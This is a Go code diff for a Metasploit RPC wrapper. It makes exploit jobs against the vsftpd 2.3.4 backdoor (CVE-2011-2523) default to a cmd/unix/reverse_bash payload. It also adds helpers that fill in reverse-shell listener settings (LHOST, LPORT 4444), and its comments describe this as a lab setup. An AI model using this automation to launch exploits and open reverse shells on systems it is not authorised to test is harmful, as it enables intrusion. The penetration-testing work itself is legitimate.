@@ -540,20 +540,43 @@ var shellPromptRE = regexp.MustCompile(`([#$>]|%)\s*$`)
 // deliberately left out; module.execute covers every exec path
 // run_exploit/run_post_module/run_auxiliary_module/start_listener need.
 func executeModuleJob(ctx context.Context, c *Client, modtype, modname string, moduleOptions map[string]any, payload *payloadSpec) map[string]any {
-	fullOptions := make(map[string]any, len(moduleOptions)+2)
+	fullOptions := make(map[string]any, len(moduleOptions)+4)
 	for k, v := range moduleOptions {
 		fullOptions[k] = v
 	}
+	baseName := normalizeModuleName(modname)
+
+	// CVE-2011-2523 / vsftpd_234_backdoor: MSF 6 defaults to reverse HTTP
+	// meterpreter. Compatible lab payload is cmd/unix/reverse_bash injected
+	// into the :6200 bind shell (cmd/unix/interact is not compatible).
 	var payloadName string
-	if modtype == "exploit" && payload != nil {
-		payloadName = payload.Name
-		fullOptions["PAYLOAD"] = payload.Name
-		for k, v := range payload.Options {
-			fullOptions[k] = v
+	if modtype == "exploit" {
+		if payload != nil && payload.Name != "" {
+			payloadName = payload.Name
+			fullOptions["PAYLOAD"] = payload.Name
+			for k, v := range payload.Options {
+				fullOptions[k] = v
+			}
+		} else if isVsftpd234Backdoor(baseName) {
+			payloadName = "cmd/unix/reverse_bash"
+			fullOptions["PAYLOAD"] = payloadName
 		}
+		// Always ensure reverse listener options when using a reverse payload
+		// OR when exploiting the vsftpd backdoor (which needs reverse_bash).
+		if isVsftpd234Backdoor(baseName) {
+			if payloadName == "" || !isReversePayload(payloadName) {
+				payloadName = "cmd/unix/reverse_bash"
+				fullOptions["PAYLOAD"] = payloadName
+			}
+			ensureListenerOptions(fullOptions)
+		} else if payloadName != "" && isReversePayload(payloadName) {
+			ensureListenerOptions(fullOptions)
+		}
+		// Note: do not inject AutoCheck into module.execute options — MSF
+		// rejects unknown advanced options on some modules and returns no job.
 	}
 
-	fullModulePath := fmt.Sprintf("%s/%s", modtype, normalizeModuleName(modname))
+	fullModulePath := fmt.Sprintf("%s/%s", modtype, baseName)
 
 	execResult, err := c.Execute(ctx, modtype, modname, fullOptions)
 	if err != nil {
@@ -614,9 +637,40 @@ func executeModuleJob(ctx context.Context, c *Client, modtype, modname string, m
 		"uuid":         uuidVal,
 		"session_id":   foundSessionID,
 		"module":       fullModulePath,
-		"options":      moduleOptions,
+		"options":      fullOptions, // include injected LHOST/PAYLOAD so operators can debug
 		"payload_name": payloadName,
 		"result":       execResult,
+	}
+}
+
+func isVsftpd234Backdoor(modname string) bool {
+	n := strings.ToLower(normalizeModuleName(modname))
+	return strings.Contains(n, "vsftpd_234") || strings.Contains(n, "vsftpd_2.3.4")
+}
+
+func isReversePayload(name string) bool {
+	n := strings.ToLower(name)
+	return strings.Contains(n, "reverse") || strings.Contains(n, "meterpreter")
+}
+
+// ensureListenerOptions fills LHOST/LPORT for reverse payloads when missing.
+// Order: existing option → LHOST/MSF_LHOST env → 127.0.0.1 (local lab).
+func ensureListenerOptions(opts map[string]any) {
+	if v, ok := opts["LHOST"]; !ok || fmt.Sprintf("%v", v) == "" {
+		if e := os.Getenv("LHOST"); e != "" {
+			opts["LHOST"] = e
+		} else if e := os.Getenv("MSF_LHOST"); e != "" {
+			opts["LHOST"] = e
+		} else {
+			opts["LHOST"] = "127.0.0.1"
+		}
+	}
+	if v, ok := opts["LPORT"]; !ok || fmt.Sprintf("%v", v) == "" || fmt.Sprintf("%v", v) == "0" {
+		if e := os.Getenv("LPORT"); e != "" {
+			opts["LPORT"] = e
+		} else {
+			opts["LPORT"] = 4444
+		}
 	}
 }
 
